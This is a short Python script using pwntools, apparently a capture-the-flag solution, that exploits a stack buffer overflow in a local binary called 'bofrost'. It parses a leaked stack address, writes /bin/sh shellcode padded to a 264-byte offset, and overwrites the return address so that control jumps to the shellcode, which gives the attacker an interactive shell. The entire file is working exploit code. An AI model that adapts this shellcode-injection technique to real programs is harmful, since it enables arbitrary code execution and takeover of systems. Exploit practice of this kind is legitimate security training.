from pwn import *

context.binary = "./bofrost"
p = process()

"""p.recvuntil(b"RSP = ")
stack_leak = int(p.recvline().decode().strip(), 16)"""
stack_leak = int(p.recvline_regex(b"RSP").decode().split()[-1], 16)
print(stack_leak)

shellcode = asm(shellcraft.sh())
offset = 264
#payload = shellcode.ljust(offset, b"A") + p64(stack_leak + 0x10)
payload = shellcode + b"A" * (offset - len(shellcode)) + p64(stack_leak + 0x10)

p.sendline(payload)
p.interactive()